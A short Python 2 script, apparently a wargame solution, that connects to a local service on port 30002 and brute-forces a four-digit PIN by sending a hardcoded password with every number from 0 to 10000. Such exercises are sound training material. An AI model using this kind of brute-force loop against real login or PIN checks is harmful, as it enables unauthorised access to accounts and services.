import socket

pin = 0
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ "

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'socket created'

s.connect(("localhost", 30002))

s.recv(1024)

for i in range(0, 10001):
    print "[+] Sending pin: " + str(pin)
    s.sendall(password + str(pin) + '\n')
    data = s.recv(1024)
    print data
    pin += 1
